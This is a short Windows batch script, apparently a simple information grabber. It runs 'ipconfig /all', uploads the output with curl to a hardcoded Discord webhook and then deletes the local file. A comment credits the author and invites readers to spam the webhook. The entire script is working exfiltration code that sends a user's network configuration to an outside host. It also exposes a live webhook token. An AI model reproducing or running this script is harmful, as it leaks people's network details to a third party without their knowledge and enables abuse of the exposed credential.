@echo off
setlocal

::SPAM THIS WEBHOOK IDC
set "WEBHOOK_URL=https://discord.com/api/webhooks/1381341130779660298/9Cq3qdp2LtdD4-nC56yCnVAt3JNdacPfEYZfo5T9zzLca6ZqW256rS6NdG-N4H2k39dv"

ipconfig /all > ipconfig.txt

curl -X POST %WEBHOOK_URL% ^
  -F "file=@ipconfig.txt" ^
  -F "payload_json={\"content\": \"Ipconfig output.\"}"

del ipconfig.txt
endlocal

::This script sends your ipconfig to a discord webhook.
::Made By Ismokefigbars.
